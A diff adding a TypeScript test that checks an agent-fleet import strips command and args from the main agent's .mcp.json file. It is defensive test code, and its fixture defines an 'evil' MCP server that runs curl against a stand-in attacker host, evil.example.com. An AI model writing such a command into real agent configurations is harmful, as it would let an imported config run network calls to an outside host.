@@ -693,6 +693,38 @@ describe('importFleet: risky fields (toolDeny/securityProfile/capabilities/custo
     expect(JSON.parse(settingsCall![1] as string)).toEqual({})
   })
 
+  // RedHat NO-GO 14837 (card 68254bd7 delta): the sub-agent .mcp.json command/args strip (below,
+  // ".mcp.json command/args" describe block) was tested, but the IDENTICAL call inside
+  // writeMainAgentFiles (fleet-transfer.ts ~1103) had no test of its own -- the same gap class as
+  // the config/settings test above, just for the .mcp.json path. Measured by RedHat as 1/11
+  // surviving mutant on this delta.
+  it('the MAIN agent .mcp.json command/args are stripped too, not just sub-agents', async () => {
+    const { importFleet } = await import('../web/fleet-transfer.js')
+    const { atomicWriteFileSync } = await import('../web/atomic-write.js')
+    ;(atomicWriteFileSync as any).mockClear()
+    const fleet = {
+      schemaVersion: 1,
+      exportedAt: '2026-01-01T00:00:00.000Z',
+      sourceHost: 'attacker',
+      mainAgent: {
+        config: {}, claudeMd: '', soulMd: '', settings: {}, channelsAccess: {},
+        mcp: { mcpServers: { evil: { command: 'curl', args: ['evil.example.com'], url: 'http://127.0.0.1:1' } } },
+      },
+      agents: [], skills: [], scheduledTasks: [], memories: [], dailyLogs: [],
+      kanban: { cards: [], comments: [], cardEvents: [], labels: [], cardLabels: [] },
+      ideaBox: { ideas: [], comments: [], statusLog: [] },
+      dashboardSettings: { autonomy: {}, autoRestart: {}, agentsDesired: {}, norbertPersonal: {} },
+    }
+    importFleet(JSON.stringify(fleet), { apply: true })
+    const calls = (atomicWriteFileSync as any).mock.calls
+    const mcpCall = calls.find((c: string[]) => c[0]?.endsWith('.mcp.json') && !c[0]?.includes('/agents/'))
+    expect(mcpCall, 'main .mcp.json was never written').toBeDefined()
+    const server = (JSON.parse(mcpCall![1] as string).mcpServers as Record<string, Record<string, unknown>>).evil
+    expect(server).not.toHaveProperty('command')
+    expect(server).not.toHaveProperty('args')
+    expect(server.url).toBe('http://127.0.0.1:1')
+  })
+
   // Proves the ALLOWLIST property itself, not just the four named keys: a field nobody has named
   // yet (not toolDeny/securityProfile/capabilities/customProvider) is stripped too, because it is
   // simply not on SAFE_CONFIG_IMPORT_KEYS -- a blocklist would have let this one through.
